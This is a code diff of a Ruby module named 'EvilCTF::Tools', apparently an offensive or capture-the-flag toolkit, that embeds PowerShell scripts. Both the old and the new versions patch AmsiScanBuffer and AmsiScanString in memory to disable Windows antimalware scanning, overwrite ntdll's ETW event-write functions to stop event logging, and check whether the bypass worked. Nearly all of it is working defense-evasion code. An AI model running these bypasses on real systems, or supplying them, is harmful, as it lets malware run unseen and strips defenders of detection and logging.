@@ -216,68 +216,69 @@ module EvilCTF::Tools
   }.freeze
   # AMSI bypass script
   BYPASS_4MSI_PS = <<~PS
-    $kernel32 = @"
-    using System; using System.Runtime.InteropServices;
-    public class kernel32 {
-        [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
-        [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+    try {
+      $kernel32 = 'using System; using System.Runtime.InteropServices; public class kernel32 { [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name); [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect); }'
+      Add-Type -TypeDefinition $kernel32 -ErrorAction SilentlyContinue
+
+      $amsiDll = [kernel32]::LoadLibrary("amsi.dll")
+      if ($amsiDll -eq [IntPtr]::Zero) {
+        "[!] AMSI bypass failed: amsi.dll not loaded"
+      } else {
+        $patch = [Byte[]] (0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0xC3)
+        $scanBuffer = [kernel32]::GetProcAddress($amsiDll, "AmsiScanBuffer")
+        if ($scanBuffer -ne [IntPtr]::Zero) {
+          $oldProtect = 0
+          [kernel32]::VirtualProtect($scanBuffer, [uint32]13, 0x40, [ref]$oldProtect) | Out-Null
+          [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $scanBuffer, 13)
+          "[+] AmsiScanBuffer patched"
+        } else {
+          "[!] AMSI bypass warning: AmsiScanBuffer not found"
+        }
+
+        # Fallback: also patch AmsiScanString (newer Windows builds)
+        $scanString = [kernel32]::GetProcAddress($amsiDll, "AmsiScanString")
+        if ($scanString -ne [IntPtr]::Zero) {
+          $oldProtectString = 0
+          [kernel32]::VirtualProtect($scanString, [uint32]13, 0x40, [ref]$oldProtectString) | Out-Null
+          [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $scanString, 13) | Out-Null
+          "[+] AmsiScanString patched as fallback"
+        }
+      }
+      "[+] AMSI bypass routine completed"
+    } catch {
+      "[!] AMSI bypass exception: $($_.Exception.Message)"
     }
-    "@
-    Add-Type $kernel32
-    $amsiDll = [kernel32]::LoadLibrary("amsi.dll")
-    $scanBuffer = [kernel32]::GetProcAddress($amsiDll, "AmsiScanBuffer")
-    $oldProtect = 0
-    [kernel32]::VirtualProtect($scanBuffer, [uint32]13, 0x40, [ref]$oldProtect) | Out-Null
-    $patch = [Byte[]] (0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0xC3)
-    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $scanBuffer, 13)
-    # Fallback: also patch AmsiScanString (newer Windows builds)
-    $scanString = [kernel32]::GetProcAddress($amsiDll, "AmsiScanString")
-    if ($scanString -ne [IntPtr]::Zero) {
-        $oldProtectString = 0
-        [kernel32]::VirtualProtect($scanString, [uint32]13, 0x40, [ref]$oldProtectString) | Out-Null
-        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $scanString, 13) | Out-Null
-        "[+] AmsiScanString patched as fallback"
-    }
-    "[+] AMSI bypassed (AmsiScanBuffer patched)"
-    try { IEX ("Am"+"siU"+"tils") } catch { "[+] Bypass confirmed" }
   PS
   # ETW bypass script
   ETW_BYPASS_PS = <<~PS
-    $kernel32 = @"
-    using System; using System.Runtime.InteropServices;
-    public class kernel32 {
-        [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
-        [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
-    }
-    "@
-    Add-Type $kernel32
-    $ntdll = [kernel32]::LoadLibrary("ntdll.dll")
-    $funcs = @("EtwEventWrite","EtwEventWriteTransfer","EtwEventWriteFull","EtwEventWriteEx","EtwEventWriteNoCallback","EtwEventWriteStart","EtwEventWriteEnd","EtwEventWriteExStart")
-    $patch = [Byte[]] (0x48, 0x33, 0xC0, 0x48, 0x33, 0xC0, 0x48, 0xC3)
-    foreach ($f in $funcs) {
-      $addr = [kernel32]::GetProcAddress($ntdll, $f)
-      if ($addr -ne 0) {
-        $old = 0
-        [kernel32]::VirtualProtect($addr, 4, 0x40, [ref]$old) | Out-Null
-        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 4)
-      }
-    }
     try {
-      $type = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
-      $field = $type.GetField('etwProvider','NonPublic,Static')
-      if ($field -ne $null) {
-        $guid = [Guid]::NewGuid()
-        $field.SetValue($null, [Activator]::CreateInstance("System.Diagnostics.Eventing.EventProvider", $guid))
-        "[+] ETW provider replaced with GUID: $($guid.ToString())"
+      $kernel32 = 'using System; using System.Runtime.InteropServices; public class kernel32 { [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name); [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect); }'
+      Add-Type -TypeDefinition $kernel32 -ErrorAction SilentlyContinue
+
+      $ntdll = [kernel32]::LoadLibrary("ntdll.dll")
+      if ($ntdll -eq [IntPtr]::Zero) {
+        "[!] ETW bypass failed: ntdll.dll not loaded"
       } else {
-        "[+] ETW provider field not found, continuing with patch-only bypass"
+        # Patch only the most stable ETW exports to reduce provider-host crashes.
+        $funcs = @("EtwEventWrite", "EtwEventWriteTransfer", "EtwEventWriteFull", "EtwEventWriteEx")
+        $patch = [Byte[]] (0x48, 0x33, 0xC0, 0xC3) # xor rax,rax ; ret
+        $patchLen = [uint32]$patch.Length
+        $patched = 0
+
+        foreach ($f in $funcs) {
+          $addr = [kernel32]::GetProcAddress($ntdll, $f)
+          if ($addr -ne [IntPtr]::Zero) {
+            $old = 0
+            [kernel32]::VirtualProtect($addr, $patchLen, 0x40, [ref]$old) | Out-Null
+            [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)
+            $patched++
+          }
+        }
+        "[+] ETW patch-only bypass completed (patched funcs: $patched)"
       }
     } catch {
-      "[+] ETW provider replacement: $($_.Exception.Message)"
+      "[!] ETW bypass exception: $($_.Exception.Message)"
     }
-    "[+] Full ETW bypass completed"
   PS
 
   # Windows version-aware bypass selector
@@ -286,52 +287,12 @@ module EvilCTF::Tools
     $arch = $env:PROCESSOR_ARCHITECTURE
     $psVersion = $PSVersionTable.PSVersion.Major
     "[+] OS Build: $osBuild | Arch: $arch | PS Version: $psVersion"
-    if ([int]$osBuild -ge 22000) {
+    if ([int]$osBuild -lt 9600) {
+      "[+] Legacy Windows build detected - using conservative bypass mode"
+      "[+] Standard bypass will be used (BYPASS_4MSI_PS + ETW_BYPASS_PS)"
+    } elseif ([int]$osBuild -ge 22000) {
       "[+] Windows 11/Server 2022+ detected - using enhanced bypass"
-      # Enhanced bypass for Windows 11/2022+
-      $enhancedBypass = <<~PS2
-        $kernel32 = @"
-        using System; using System.Runtime.InteropServices;
-        public class kernel32 {
-            [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
-            [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-            [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
-        }
-        "@
-        Add-Type $kernel32
-        $amsiDll = [kernel32]::LoadLibrary("amsi.dll")
-        $scanBuffer = [kernel32]::GetProcAddress($amsiDll, "AmsiScanBuffer")
-        $oldProtect = 0
-        [kernel32]::VirtualProtect($scanBuffer, [uint32]13, 0x40, [ref]$oldProtect) | Out-Null
-        $patch = [Byte[]] (0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0xC3)
-        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $scanBuffer, 13)
-        $scanString = [kernel32]::GetProcAddress($amsiDll, "AmsiScanString")
-        if ($scanString -ne [IntPtr]::Zero) {
-            $oldPS = 0; [kernel32]::VirtualProtect($scanString, [uint32]13, 0x40, [ref]$oldPS) | Out-Null
-            [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $scanString, 13) | Out-Null
-        }
-        $ntdll = [kernel32]::LoadLibrary("ntdll.dll")
-        $funcs = @("EtwEventWrite","EtwEventWriteTransfer","EtwEventWriteFull","EtwEventWriteEx","EtwEventWriteNoCallback","EtwEventWriteStart","EtwEventWriteEnd","EtwEventWriteExStart")
-        $patch = [Byte[]] (0x48, 0x33, 0xC0, 0x48, 0x33, 0xC0, 0x48, 0xC3)
-        foreach ($f in $funcs) {
-            $addr = [kernel32]::GetProcAddress($ntdll, $f)
-            if ($addr -ne [IntPtr]::Zero) {
-                $old = 0; [kernel32]::VirtualProtect($addr, 8, 0x40, [ref]$old) | Out-Null
-                [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 8)
-            }
-        }
-        try {
-            $type = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
-            $field = $type.GetField('etwProvider','NonPublic,Static')
-            if ($field -ne $null) {
-                $guid = [Guid]::NewGuid()
-                $field.SetValue($null, [Activator]::CreateInstance("System.Diagnostics.Eventing.EventProvider", $guid))
-                "[+] Enhanced ETW provider replaced: $guid"
-            }
-        } catch { }
-        "[+] Enhanced bypass (Windows 11/2022+) completed"
-      PS2
-      $enhancedBypass
+      "[+] Enhanced AMSI/ETW routines enabled by default constants"
     } else {
       "[+] Windows 10/Server 2016/2019 detected - using standard bypass"
       "[+] Standard bypass will be used (BYPASS_4MSI_PS + ETW_BYPASS_PS)"
@@ -350,25 +311,14 @@ module EvilCTF::Tools
             if ($amsiResult -eq 0x80070007) {
                 "[+] AMSI bypass verified (return code: 0x80070007)"
             } else {
-                "[!] AMSI bypass failed (return code: 0x{0:x}" -f $amsiResult)
+          "[!] AMSI bypass failed (return code: 0x{0:x})" -f $amsiResult
             }
         }
     } catch {
         "[+] AMSI bypass status unknown (AmsiUtils not found)"
     }
-    # Verify ETW bypass
-    try {
-        $etwType = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
-        $etwField = $etwType.GetField('etwProvider', 'NonPublic, Static')
-        $etwValue = $etwField.GetValue($null)
-        if ($etwValue -ne $null -and $etwValue.GetType().FullName -like '*EventProvider*') {
-            "[+] ETW bypass verified (provider: $($etwValue.GetType().Name))"
-        } else {
-            "[!] ETW bypass may have failed (provider is null or wrong type)"
-        }
-    } catch {
-        "[+] ETW bypass status unknown (PSEtwLogProvider not found)"
-    }
+    # ETW verification is informational in patch-only mode.
+    "[+] ETW bypass verification: patch-only mode enabled"
     "[+] Bypass verification complete"
   PS
 
